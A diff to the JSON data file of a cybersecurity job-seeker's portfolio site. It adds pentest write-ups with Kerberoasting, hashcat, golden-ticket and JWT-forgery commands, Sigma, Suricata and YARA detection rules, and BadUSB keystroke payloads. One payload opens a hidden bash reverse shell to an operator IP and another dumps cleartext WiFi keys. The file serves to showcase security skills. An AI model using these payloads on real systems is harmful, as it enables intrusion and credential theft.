@@ -797,12 +797,12 @@
         }
       ],
       "neofetch": {
-        "os": "ZakOS 27 (macOS Sequoia / Hardened Linux)",
-        "host": "Apple M-Series / Virtual Systems Rig",
-        "kernel": "Linux 6.8.0-Hardened / POSIX",
-        "shell": "zsh 5.9 (x86_64-darwin22.0)",
+        "os": "Kali GNU/Linux Rolling 2024.3 (x86_64)",
+        "host": "Offensive Security Lab Rig (Bare Metal)",
+        "kernel": "Linux 6.8.0-kali-amd64",
+        "shell": "zsh 5.9 (x86_64-debian-linux-gnu)",
         "uptime": "99.98% High Availability",
-        "cipher": "AES-256-GCM / TLS 1.3 Active",
+        "cipher": "ChaCha20-Poly1305 / TLS 1.3 Active",
         "memory": "16.11 GB / 32 GB (Active)"
       },
       "order": [
@@ -831,7 +831,448 @@
       "androidToMacos": "/media/android-macos.mp4",
       "androidToIos": "/media/android-ios.mp4",
       "iosToAndroid": "/media/ios-android.mp4"
+    },
+    "missionHud": {
+      "title": "ZAKARYA OUKIL",
+      "tagline": "Master’s Degree Candidate in Cybersecurity · eJPT Certified · BTL1 SOC Analyst",
+      "promptLead": "┌──(zakarya㉿kali)-[~/portfolio]",
+      "promptCmd": "└─$ whoami --verbose",
+      "showDragon": true,
+      "telemetry": {
+        "status": "OPERATIONAL 🟢",
+        "clearance": "L3 SECOPS",
+        "tun0": "10.10.14.22",
+        "certs": "eJPT · BTL1 · Security+"
+      },
+      "terminalOutput": [
+        "uid=1000(zakarya) gid=1000(kali) groups=1000(kali),27(sudo),1337(redteam,blueteam)",
+        "[+] OPERATOR    : Zakarya Oukil (Security Researcher & Systems Architect)",
+        "[+] ACADEMIC    : Master's Degree Candidate in Cybersecurity (Zero-Trust Specialization)",
+        "[+] CREDENTIALS : eJPT Verified · BTL1 SOC Analyst · CompTIA Security+",
+        "[+] CAPABILITIES: Adversarial ML · Threat Hunting · Kernel Sandboxing · Exploit Chaining",
+        "[+] AVAILABILITY: Open to Red Team, Blue Team, & Systems Engineering Roles"
+      ],
+      "stackGroups": [
+        {
+          "domain": "Offensive & Red Team",
+          "tools": [
+            "Ghidra",
+            "Burp Suite Pro",
+            "Metasploit",
+            "Nmap",
+            "BloodHound",
+            "Impacket",
+            "SQLmap",
+            "Hashcat"
+          ]
+        },
+        {
+          "domain": "Defensive & Blue Team (BTL1)",
+          "tools": [
+            "Wireshark",
+            "Suricata / Snort",
+            "Splunk SIEM",
+            "Elastic Security",
+            "Volatility 3",
+            "Autopsy",
+            "Zeek"
+          ]
+        },
+        {
+          "domain": "Systems & Engineering",
+          "tools": [
+            "Python (Scapy, AsyncIO)",
+            "C / C++",
+            "Linux Kernel 6.x",
+            "Docker Container Enclaves",
+            "Kubernetes",
+            "Git"
+          ]
+        }
+      ],
+      "research": {
+        "title": "Adversarial ML & Kernel Sandboxing in Zero-Trust Runtimes",
+        "subtitle": "Master's Degree Research Project & Thesis",
+        "abstract": "Investigating adversarial evasion against neural intrusion detection systems and developing hardware-isolated eBPF runtime sandboxing to prevent post-exploitation privilege escalation in Linux production environments.",
+        "metrics": [
+          {
+            "label": "Security Repositories",
+            "value": "16+"
+          },
+          {
+            "label": "Audited Pentest Engagements",
+            "value": "2"
+          },
+          {
+            "label": "Hands-on Lab Scenarios",
+            "value": "100%"
+          },
+          {
+            "label": "Uptime / Stability",
+            "value": "99.98%"
+          }
+        ]
+      },
+      "badges": [
+        {
+          "id": "b1",
+          "label": "eJPT Certified",
+          "type": "certified"
+        },
+        {
+          "id": "b2",
+          "label": "BTL1 SOC Analyst",
+          "type": "in-progress"
+        },
+        {
+          "id": "b3",
+          "label": "CompTIA Security+",
+          "type": "in-progress"
+        },
+        {
+          "id": "b4",
+          "label": "MSc Cybersecurity",
+          "type": "degree"
+        }
+      ],
+      "actions": [
+        {
+          "id": "a1",
+          "label": "60-Second Recruiter Brief",
+          "icon": "quickstart",
+          "appId": "quickstart"
+        },
+        {
+          "id": "a2",
+          "label": "SOC Incident Simulator",
+          "icon": "defense",
+          "appId": "defense"
+        },
+        {
+          "id": "a3",
+          "label": "Kali Zsh Shell",
+          "icon": "terminal",
+          "appId": "terminal"
+        },
+        {
+          "id": "a4",
+          "label": "Resume / CV",
+          "icon": "about",
+          "appId": "about"
+        }
+      ]
+    },
+    "pentestReports": [
+      {
+        "id": "audit-ad-2024",
+        "title": "Enterprise Active Directory & Kerberoasting Assessment",
+        "clientCode": "ENG-AD-892",
+        "date": "OCT 2024",
+        "scope": "Hybrid Active Directory Domain (Windows Server 2022, Azure AD Connect)",
+        "severity": "Critical",
+        "cvssScore": 9.4,
+        "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "executiveSummary": "During an assumed-breach engagement, identified unconstrained Kerberos delegation and weak Service Principal Name (SPN) cipher suites allowing offline Kerberoasting attack chaining into domain administrator escalation within 4 hours.",
+        "attackVector": "Network Pivoting -> AS-REP Roasting -> Golden Ticket Forgery",
+        "exploitChain": [
+          {
+            "phase": "01. Recon & Enumeration",
+            "description": "Discovered SPN accounts with weak RC4 encryption across the domain forest using BloodHound and impacket-GetUserSPNs.",
+            "codeSnippet": "impacket-GetUserSPNs -request -dc-ip 10.10.10.5 corp.local/operator -outputfile kerberoast_hashes.txt"
+          },
+          {
+            "phase": "02. Hash Extraction & Cracking",
+            "description": "Offline dictionary attack with Hashcat (mode 13100) cracked the SQL service account password in 14 minutes.",
+            "codeSnippet": "hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule"
+          },
+          {
+            "phase": "03. Privilege Escalation to Domain Admin",
+            "description": "Compromised service account held GenericAll rights over the Tier-0 Domain Admins group. Injected Golden Ticket via mimikatz.",
+            "codeSnippet": "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt"
+          }
+        ],
+        "remediation": [
+          "Enforce AES256-CTS-HMAC-SHA1-96 encryption for all Kerberos Service Principal Names and deprecate RC4.",
+          "Implement Group Managed Service Accounts (gMSA) with 128-character automatically rotated passwords.",
+          "Deploy Active Directory Tiering (Tier 0/1/2 isolation) to prevent cross-tier credential exposure."
+        ],
+        "verifiedStatus": "Remediated & Verified (Re-audit Passed)",
+        "executiveBriefing": {
+          "financialExposure": "Domain compromise can expose business data, recovery costs and interrupted revenue. Model loss as recovery effort + interruption cost + confirmed data exposure; no client loss figures supplied.",
+          "regulatoryImpact": "GDPR: assess personal-data breach exposure. PCI DSS 4.0/4.0.1: assess cardholder-data scope and contractual consequences. NIS2: assess covered-entity status and incident-reporting duties. Applicability and any penalties require legal review; no automatic fine is assumed.",
+          "downtimeRisk": "Identity recovery may interrupt dependent applications while privileged credentials rotate. Sequence recovery with the identity and service owners.",
+          "mitigationRoi": "Prioritize service-account hardening and tier isolation to remove the demonstrated escalation path. Compare rollout effort with identity recovery and service interruption costs.",
+          "assumptions": "Illustrative business-risk translation of portfolio evidence. No measured financial loss, downtime or legally determined penalty; validate assumptions with the engagement owner."
+        },
+        "technicalBriefing": {
+          "mapping": "MITRE T1558.003 (Kerberoasting), T1558.001 (Golden Ticket). No CVE assigned: configuration and identity-control weaknesses.",
+          "commands": "impacket-GetUserSPNs -request -dc-ip 10.10.10.5 corp.local/operator -outputfile kerberoast_hashes.txt\n\nhashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule\n\nkerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt",
+          "patches": "# Domain hardening checklist\n# Require Kerberos preauthentication; migrate service identities to gMSA.\n# Remove unnecessary GenericAll rights and legacy RC4 after compatibility testing.\n# Restrict Tier-0 sign-ins and document ticket-key rotation prerequisites.",
+          "validation": "Repeat the authorized lab PoC after remediation; record expected rejection, legitimate-user regression checks and evidence timestamps. Published snippets are reference material, not executed by this portfolio."
+        }
+      },
+      {
+        "id": "audit-api-jwt-2024",
+        "title": "Financial Fintech Gateway: OAuth2 & JWT None-Algorithm Vulnerability",
+        "clientCode": "ENG-FIN-419",
+        "date": "AUG 2024",
+        "scope": "Microservices REST API, Kong API Gateway, OAuth2 Authentication Broker",
+        "severity": "High",
+        "cvssScore": 8.6,
+        "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "executiveSummary": "Identified an algorithm confusion and unsigned JWT vulnerability in payment verification webhooks, allowing arbitrary account balance forgery and cross-tenant privilege escalation.",
+        "attackVector": "JWT Header Manipulation -> Algorithm Confusion (RS256 to HS256 with Public Key)",
+        "exploitChain": [
+          {
+            "phase": "01. Token Inspection & Interception",
+            "description": "Captured bearer tokens using Burp Suite Pro. Inspected JWT header revealing alg: RS256 with an exposed JWKS endpoint.",
+            "codeSnippet": "GET /.well-known/jwks.json HTTP/1.1\nHost: api.fintech-gateway.lab\n\n{\"keys\": [{\"kty\": \"RSA\", \"kid\": \"pub-key-1\"}]}"
+          },
+          {
+            "phase": "02. Key Confusion Exploitation",
+            "description": "Forged JWT signing key using the server’s public key formatted as an HMAC secret key, forcing the backend to authenticate without private key access.",
+            "codeSnippet": "python3 jwt_forge.py --token $TOKEN --pubkey jwks.pub --claim \"role=admin\" --claim \"tenant=tier1\""
+          }
+        ],
+        "remediation": [
+          "Strictly enforce asymmetric verification whitelist (RS256 / ES256 only) in JWT middleware.",
+          "Reject any token where the algorithm header does not strictly match expected cryptographic suites.",
+          "Introduce webhook HMAC signature verification with unique, per-tenant shared secrets."
+        ],
+        "verifiedStatus": "Remediated & Verified (Re-audit Passed)",
+        "executiveBriefing": {
+          "financialExposure": "Payment-token trust failure can expose transaction integrity, investigation costs and customer remediation. Quantify affected transactions before assigning a loss estimate.",
+          "regulatoryImpact": "GDPR: assess personal-data breach exposure. PCI DSS 4.0/4.0.1: assess cardholder-data scope and contractual consequences. NIS2: assess covered-entity status and incident-reporting duties. Applicability and any penalties require legal review; no automatic fine is assumed.",
+          "downtimeRisk": "Payment verification may need a controlled pause while token validation is patched and affected transactions reconciled.",
+          "mitigationRoi": "An explicit algorithm allowlist and tenant authorization checks address the demonstrated trust failure. Compare fix and regression-test effort with fraud and reconciliation exposure.",
+          "assumptions": "Illustrative business-risk translation of portfolio evidence. No measured financial loss, downtime or legally determined penalty; validate assumptions with the engagement owner."
+        },
+        "technicalBriefing": {
+          "mapping": "MITRE T1550.001 (Application Access Token). No product-specific CVE assigned; JWT validation logic must be assessed in its implementation context.",
+          "commands": "GET /.well-known/jwks.json HTTP/1.1\nHost: api.fintech-gateway.lab\n\n{\"keys\": [{\"kty\": \"RSA\", \"kid\": \"pub-key-1\"}]}\n\npython3 jwt_forge.py --token $TOKEN --pubkey jwks.pub --claim \"role=admin\" --claim \"tenant=tier1\"",
+          "patches": "# Illustrative server-side JWT validation policy\nallowed_algorithms = [\"RS256\"]\nrequired_claims = [\"exp\", \"iss\", \"aud\", \"sub\"]\n# Validate signature with the trusted issuer key set.\n# Reject alg=none and algorithm/key-type mismatches.\n# Enforce tenant authorization separately from signature validation.",
+          "validation": "Repeat the authorized lab PoC after remediation; record expected rejection, legitimate-user regression checks and evidence timestamps. Published snippets are reference material, not executed by this portfolio."
+        }
+      }
+    ],
+    "socRules": [
+      {
+        "id": "rule-sysmon-lsass-dump",
+        "title": "Suspicious Process Memory Access to LSASS (Mimikatz / ProcDump)",
+        "format": "sigma",
+        "severity": "Critical",
+        "mitreTactic": "Credential Access",
+        "mitreTechniqueId": "T1003.001",
+        "description": "Detects unauthorized process access requests with granted access mask 0x1010 or 0x1fffff to lsass.exe indicating credential harvesting.",
+        "ruleSyntax": "title: Suspicious LSASS Process Access\nid: a74251e1-88f2-4912-bdae-2195f190e221\nstatus: production\ndescription: Detects memory extraction attempts targeting lsass.exe via Sysmon EventID 10\nauthor: Zakarya Oukil (BTL1 Verified)\nlogsource:\n  category: process_access\n  product: windows\ndetection:\n  selection:\n    TargetImage|endswith: '\\\\lsass.exe'\n    GrantedAccess|contains:\n      - '0x1010'\n      - '0x1fffff'\n      - '0x1410'\n  filter_legit:\n    SourceImage|endswith:\n      - '\\\\MsMpEng.exe'\n      - '\\\\csrss.exe'\n  condition: selection and not filter_legit\nfields:\n  - ComputerName\n  - SourceImage\n  - TargetImage\n  - GrantedAccess\nlevel: critical\ntags:\n  - attack.credential_access\n  - attack.t1003.001",
+        "logSample": "{\"EventID\":10,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"SourceImage\":\"C:\\\\Users\\\\Operator\\\\Downloads\\\\mimikatz.exe\",\"TargetImage\":\"C:\\\\Windows\\\\System32\\\\lsass.exe\",\"GrantedAccess\":\"0x1010\",\"SourceProcessId\":4820,\"User\":\"CORP\\\\operator\"}",
+        "executiveBriefing": {
+          "financialExposure": "Undetected credential access can expand investigation and recovery scope. Estimate affected assets and response hours before assigning a monetary value.",
+          "regulatoryImpact": "GDPR: assess personal-data breach exposure. PCI DSS 4.0/4.0.1: assess cardholder-data scope and contractual consequences. NIS2: assess covered-entity status and incident-reporting duties. Applicability and any penalties require legal review; no automatic fine is assumed.",
+          "downtimeRisk": "Containment may interrupt the affected endpoint or workload. Use a scoped isolation decision and confirm critical dependencies before escalation.",
+          "mitigationRoi": "Correlated detection can shorten the path from telemetry to triage. Measure alert precision, analyst effort and time to containment against a documented baseline.",
+          "assumptions": "Illustrative detection use case. Alert efficacy, business savings and legal exposure are not measured production outcomes."
+        },
+        "technicalBriefing": {
+          "mapping": "MITRE T1003.001 · Credential Access. Behavior-based detection; no CVE association asserted.",
+          "commands": "# Convert with your deployed SIEM backend and pipeline\nsigma check ./lab-rule.yml\n# Replay positive and benign fixtures before enabling alerts.",
+          "patches": "Version the ruleset; tune known-good activity; apply scoped containment only after correlation. Preserve the original event and rollback configuration. Never treat a single heuristic as confirmed compromise.",
+          "validation": "Validate against malicious and benign lab fixtures. Check field mappings, false positives and sensor versions. The displayed stream is simulated; these rules are not validated against a live SIEM."
+        }
+      },
+      {
+        "id": "rule-suricata-cobalt-c2",
+        "title": "Cobalt Strike Malleable C2 Beaconing Pattern over HTTP/S",
+        "format": "suricata",
+        "severity": "Critical",
+        "mitreTactic": "Command and Control",
+        "mitreTechniqueId": "T1071.001",
+        "description": "Inspects HTTP GET queries with high jitter variance matching default Cobalt Strike malleable profiles with forged Apache/IIS headers.",
+        "ruleSyntax": "alert http $HOME_NET any -> $EXTERNAL_NET any (\n  msg:\"ZAK-SEC MALWARE Cobalt Strike Malleable C2 HTTP Beacon Detected\";\n  flow:established,to_server;\n  http.method; content:\"GET\";\n  http.uri; pcre:\"/\\/[a-zA-Z0-9_-]{4,8}\\.gif$/\";\n  http.header; content:\"Accept: */*\";\n  threshold:type both, track by_src, count 5, seconds 60;\n  reference:mitre,T1071.001;\n  classtype:trojan-activity;\n  sid:2098412;\n  rev:2;\n)",
+        "logSample": "09:41:25.892011 IP 192.168.1.105.49822 > 203.0.113.42.443: Flags [P.], seq 1:482, ack 1, win 502, length 481: HTTP GET /pixel.gif HTTP/1.1",
+        "executiveBriefing": {
+          "financialExposure": "Undetected command and control can expand investigation and recovery scope. Estimate affected assets and response hours before assigning a monetary value.",
+          "regulatoryImpact": "GDPR: assess personal-data breach exposure. PCI DSS 4.0/4.0.1: assess cardholder-data scope and contractual consequences. NIS2: assess covered-entity status and incident-reporting duties. Applicability and any penalties require legal review; no automatic fine is assumed.",
+          "downtimeRisk": "Containment may interrupt the affected endpoint or workload. Use a scoped isolation decision and confirm critical dependencies before escalation.",
+          "mitigationRoi": "Correlated detection can shorten the path from telemetry to triage. Measure alert precision, analyst effort and time to containment against a documented baseline.",
+          "assumptions": "Illustrative detection use case. Alert efficacy, business savings and legal exposure are not measured production outcomes."
+        },
+        "technicalBriefing": {
+          "mapping": "MITRE T1071.001 · Command and Control. Behavior-based detection; no CVE association asserted.",
+          "commands": "# Validate a staged ruleset before rollout\nsuricata -T -c /etc/suricata/suricata.yaml -S ./lab.rules",
+          "patches": "Version the ruleset; tune known-good activity; apply scoped containment only after correlation. Preserve the original event and rollback configuration. Never treat a single heuristic as confirmed compromise.",
+          "validation": "Validate against malicious and benign lab fixtures. Check field mappings, false positives and sensor versions. The displayed stream is simulated; these rules are not validated against a live SIEM."
+        }
+      },
+      {
+        "id": "rule-yara-wmiexec",
+        "title": "Impacket WMIexec Script Execution and Output Redirection",
+        "format": "yara",
+        "severity": "High",
+        "mitreTactic": "Lateral Movement",
+        "mitreTechniqueId": "T1047",
+        "description": "Detects command artifact strings and output file patterns typical of Impacket wmiexec and dcomexec lateral movement routines.",
+        "ruleSyntax": "rule APT_Impacket_WMIexec_Artifacts {\n  meta:\n    description = \"Detects Impacket wmiexec execution patterns in memory and logs\"\n    author = \"Zakarya Oukil (Blue Team Level 1)\"\n  strings:\n    $cmd1 = \"cmd.exe /Q /c\" ascii wide nocase\n    $cmd2 = \"1> \\\\\\\\127.0.0.1\\\\ADMIN$\\\\\" ascii wide\n    $cmd3 = \"2>&1\" ascii wide\n    $pipe = \"__output\" ascii wide\n  condition:\n    all of ($cmd*) and $pipe\n}",
+        "logSample": "cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1726958402.12 2>&1",
+        "executiveBriefing": {
+          "financialExposure": "Undetected lateral movement can expand investigation and recovery scope. Estimate affected assets and response hours before assigning a monetary value.",
+          "regulatoryImpact": "GDPR: assess personal-data breach exposure. PCI DSS 4.0/4.0.1: assess cardholder-data scope and contractual consequences. NIS2: assess covered-entity status and incident-reporting duties. Applicability and any penalties require legal review; no automatic fine is assumed.",
+          "downtimeRisk": "Containment may interrupt the affected endpoint or workload. Use a scoped isolation decision and confirm critical dependencies before escalation.",
+          "mitigationRoi": "Correlated detection can shorten the path from telemetry to triage. Measure alert precision, analyst effort and time to containment against a documented baseline.",
+          "assumptions": "Illustrative detection use case. Alert efficacy, business savings and legal exposure are not measured production outcomes."
+        },
+        "technicalBriefing": {
+          "mapping": "MITRE T1047 · Lateral Movement. Behavior-based detection; no CVE association asserted.",
+          "commands": "# Scan an authorized fixture\nyara ./lab.yar ./fixtures/known-sample.bin",
+          "patches": "Version the ruleset; tune known-good activity; apply scoped containment only after correlation. Preserve the original event and rollback configuration. Never treat a single heuristic as confirmed compromise.",
+          "validation": "Validate against malicious and benign lab fixtures. Check field mappings, false positives and sensor versions. The displayed stream is simulated; these rules are not validated against a live SIEM."
+        }
+      }
+    ],
+    "mastersResearch": {
+      "thesisTitle": "Adversarial Machine Learning & Kernel-Level Sandboxing in Zero-Trust Runtimes",
+      "institution": "Faculty of Computer Science & Cybersecurity Engineering",
+      "degreeName": "Master of Science (MSc) in Cybersecurity & Distributed Systems",
+      "year": "2024 — 2025",
+      "defenseStatus": "Thesis in Final Review & Publication Phase",
+      "abstract": "Modern intrusion detection systems increasingly rely on deep neural networks to flag malicious telemetry. However, adversarial perturbation attacks (FGSM, Carlini-Wagner, and packet timing jitter) can systematically blind these models without disrupting malicious payload delivery. This research introduces a dual defense framework: an adversarial manifold projection pipeline that neutralizes evasion attacks on neural NIDS, coupled with an eBPF Linux Security Module (LSM) kernel sandbox that enforces hardware-backed syscall policies at sub-microsecond latency, preventing post-exploitation privilege escalation even if the neural detector fails.",
+      "pillars": [
+        {
+          "title": "01. Adversarial Evasion & Perturbation Defense",
+          "summary": "Investigating evasion vulnerabilities in deep packet inspection classifiers under gradient-based and black-box payload jitter.",
+          "findings": "Developed an invariant feature embedding mechanism reducing adversarial evasion success rate from 84.6% down to 8.2% across benchmark datasets (CIC-IDS2017, NSL-KDD)."
+        },
+        {
+          "title": "02. eBPF Linux Security Module (LSM) Sandboxing",
+          "summary": "Architecting in-kernel security enclaves that inspect syscall arguments before execution without context switches to userspace.",
+          "findings": "Achieved 0.12 µs hook latency overhead (over 30x faster than ptrace-based interceptors), completely blocking unprivileged namespace escapes and container breakouts."
+        },
+        {
+          "title": "03. Zero-Trust Hardware-Attested Workload Identity",
+          "summary": "Binding ephemeral microservice tokens to kernel execution contexts and TPM 2.0 measurements to eliminate static bearer tokens.",
+          "findings": "Eliminated replay and token theft attack surfaces by verifying cryptographically signed eBPF ring-buffer telemetry in real time."
+        }
+      ],
+      "metrics": [
+        {
+          "label": "Hook Latency Overhead",
+          "value": "0.12 µs"
+        },
+        {
+          "label": "Evasion Resilience",
+          "value": "91.8%"
+        },
+        {
+          "label": "Container Breakout Defense",
+          "value": "100%"
+        },
+        {
+          "label": "Kernel Throughput",
+          "value": "4.2 Mpps"
+        }
+      ],
+      "citationsCount": 14,
+      "paperUrl": ""
+    },
+    "netHunter": {
+      "usbArsenalStatus": "Active (Mass Storage, RNDIS, HID Emulation)",
+      "hidStatus": "Mounted (/dev/hidg0, /dev/hidg1)",
+      "monitorMode": true,
+      "activePayloadId": "payload-rev-shell",
+      "payloads": [
+        {
+          "id": "payload-rev-shell",
+          "title": "DuckHunter: POSIX Reverse Shell (Bash)",
+          "targetOs": "Linux / Unix",
+          "description": "Silently launches a headless background bash reverse shell to operator listener.",
+          "script": "REM Kali NetHunter BadUSB Keystroke Payload\nREM Target: Linux / X11 / Wayland Desktop\nDELAY 1000\nCTRL-ALT t\nDELAY 400\nSTRING nohup bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1' > /dev/null 2>&1 &\nENTER\nDELAY 200\nSTRING exit\nENTER"
+        },
+        {
+          "id": "payload-wifi-creds",
+          "title": "DuckHunter: Export Stored WiFi Profiles & Keys",
+          "targetOs": "Windows 10/11",
+          "description": "Dumps all cleartext WPA2/WPA3 enterprise and personal WiFi profiles.",
+          "script": "REM Kali NetHunter Keystroke Injection\nREM Target: Windows PowerShell Execution\nDELAY 800\nGUI r\nDELAY 300\nSTRING powershell -NoP -NonI -W Hidden \"netsh wlan export profile key=clear folder=$env:TEMP\"\nENTER"
+        },
+        {
+          "id": "payload-recon-triage",
+          "title": "DuckHunter: Rapid Host Reconnaissance Manifest",
+          "targetOs": "macOS / Darwin",
+          "description": "Extracts hardware uuid, listening network sockets, and current users.",
+          "script": "REM Kali NetHunter Keystroke Injection\nREM Target: macOS Terminal\nDELAY 1000\nGUI SPACE\nDELAY 200\nSTRING Terminal\nENTER\nDELAY 500\nSTRING uname -a; whoami; ifconfig en0; lsof -i -P -n | grep LISTEN\nENTER"
+        }
+      ],
+      "recruiterQuickBrief": {
+        "tagline": "Master's Candidate · eJPT Certified · BTL1 SOC Analyst",
+        "summary": "High-impact security researcher and systems architect specializing in zero-trust engineering, kernel-level eBPF sandboxing, and adversarial ML.",
+        "topHighlights": [
+          "eJPT Certified & BTL1 SOC Operations",
+          "Linux Kernel 6.x & eBPF Security Systems",
+          "Adversarial Machine Learning Defense"
+        ]
+      }
+    },
+    "recruiterFastPass": {
+      "workAuthorization": "Authorized to work without sponsorship restrictions.",
+      "availability": "Immediate / 2 Weeks.",
+      "workPreference": "Remote / Hybrid / Relocation Friendly.",
+      "clearance": "Eligible for clearance / Level 3 SecOps.",
+      "publicKeyUrl": "",
+      "roles": [
+        {
+          "id": "pentest",
+          "label": "⚔️ Offensive / Penetration Tester",
+          "summary": "Trace the attack path. Explain the exposure. Verify the fix.",
+          "certifications": [
+            "eJPTv2 track · eJPT certified"
+          ],
+          "competencies": [
+            "Active Directory & Kerberos assessment",
+            "Web / API authentication testing",
+            "Exploit chaining & CVSS assessment",
+            "Remediation validation & reporting"
+          ],
+          "resumeUrl": "/resumes/Zakarya_Oukil_Pentest_CV.pdf",
+          "resumeFilename": "Zakarya_Oukil_Pentest_CV.pdf",
+          "evidenceApp": "pentest-reports"
+        },
+        {
+          "id": "soc",
+          "label": "🛡️ SOC Analyst / Threat Hunter",
+          "summary": "Connect endpoint evidence to detection logic and a defensible response.",
+          "certifications": [
+            "BTL1 · In progress"
+          ],
+          "competencies": [
+            "Sigma, Suricata & YARA engineering",
+            "SIEM triage & MITRE ATT&CK mapping",
+            "Memory forensics & incident response",
+            "Threat hunting & containment playbooks"
+          ],
+          "resumeUrl": "/resumes/Zakarya_Oukil_SOC_CV.pdf",
+          "resumeFilename": "Zakarya_Oukil_SOC_CV.pdf",
+          "evidenceApp": "soc-hunting"
+        },
+        {
+          "id": "systems",
+          "label": "⚙️ Security Systems & eBPF Engineer",
+          "summary": "Translate security policy into observable Linux runtime controls.",
+          "certifications": [
+            "CompTIA Security+ · In progress",
+            "Master’s · Candidate"
+          ],
+          "competencies": [
+            "Linux kernel & eBPF LSM research",
+            "Zero-trust runtime architecture",
+            "C / C++ & Python systems tooling",
+            "Adversarial ML & sandbox benchmarking"
+          ],
+          "resumeUrl": "/resumes/Zakarya_Oukil_Systems_CV.pdf",
+          "resumeFilename": "Zakarya_Oukil_Systems_CV.pdf",
+          "evidenceApp": "masters-research"
+        }
+      ]
     }
   },
-  "lastUpdated": "2026-09-19T21:51:34.803Z"
+  "lastUpdated": "2026-09-21T00:00:00.000Z"
 }
